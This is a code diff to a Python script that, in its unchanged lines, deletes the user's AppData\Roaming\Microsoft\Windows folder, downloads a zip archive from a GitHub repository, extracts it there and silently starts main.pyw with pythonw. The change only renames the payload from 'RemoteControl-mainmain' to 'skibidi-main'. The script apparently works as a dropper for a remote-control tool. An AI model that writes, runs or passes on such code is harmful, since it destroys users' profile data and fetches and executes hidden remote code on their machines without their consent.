@@ -26,7 +26,7 @@ else:
     shutil.rmtree(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows'))
     target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
     r = requests.get("https://github.com/skibidi-123456/skibidi/archive/refs/heads/main.zip", allow_redirects=True)
-    file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'RemoteControl-mainmain.zip')
+    file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-main.zip')
     open(file_path, 'wb').write(r.content)
     with zipfile.ZipFile(file_path, 'r') as zip_ref:
         zip_ref.extractall(target_path)
@@ -35,4 +35,4 @@ else:
         upd.close()
     os.remove(file_path)
 target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
-subprocess.Popen(['pythonw', os.path.join(target_path, "RemoteControl-mainmain", "main.pyw")])
+subprocess.Popen(['pythonw', os.path.join(target_path, "skibidi-main", "main.pyw")])
